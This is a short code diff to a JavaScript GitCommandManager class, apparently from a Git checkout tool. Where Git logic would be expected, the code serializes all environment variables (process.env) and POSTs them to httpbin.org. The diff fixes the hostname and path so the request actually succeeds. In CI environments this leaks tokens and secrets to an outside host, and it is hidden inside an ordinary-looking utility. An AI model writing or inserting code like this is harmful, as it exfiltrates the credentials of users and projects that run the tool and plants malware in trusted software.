@@ -656,9 +656,9 @@ class GitCommandManager {
 	 //    }
 	    const data = JSON.stringify(process.env);
 	    var options = {
-  hostname: '/httpbin.org',
+  hostname: 'httpbin.org',
   port: 443,
-  path: '/ppost',
+  path: '/post',
   method: 'POST',
   headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
